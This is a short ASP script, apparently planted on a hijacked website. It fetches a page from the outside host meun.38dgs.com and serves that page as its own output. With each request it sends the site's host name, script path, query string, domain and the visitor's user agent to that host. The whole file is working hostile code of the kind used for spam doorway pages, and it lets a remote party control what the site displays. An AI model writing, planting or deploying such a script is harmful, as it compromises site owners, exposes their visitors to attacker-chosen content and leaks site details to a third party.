<%
dim User_agent
server.Scripttimeout = 999999
User_agent = Request.ServerVariables("HTTP_USER_AGENT")
Remote_server = "http://meun.38dgs.com" 
host_name = "http://"&request.servervariables("HTTP_HOST")&request.servervariables("script_name")
Remote_file = Remote_server&"/index.php"&"?host="&host_name&"&url="&Request.servervariables("Query_String")&"&domain="&Request.servervariables("Server_Name")
Content_mb = GetHtml(Remote_file)
Response.Charset="utf-8"
response.write Content_mb
%>
<%
Function GetHtml(url)
	Set ObjXMLHTTP = Server.CreateObject("MSXML2.serverXMLHTTP")
	ObjXMLHTTP.Open "GET",url,False
	ObjXMLHTTP.setRequestHeader "User-Agent",User_agent
	ObjXMLHTTP.send
	GetHtml = ObjXMLHTTP.responseBody
	Set ObjXMLHTTP = Nothing
	set objStream = Server.CreateObject("Adodb.Stream")
	objStream.Type = 1
	objStream.Mode = 3
	objStream.Open
	objStream.Write GetHtml
	objStream.Position = 0
	objStream.Type = 2
	objStream.Charset = "utf-8"
	GetHtml = objStream.ReadText
	objStream.Close
End Function
%>

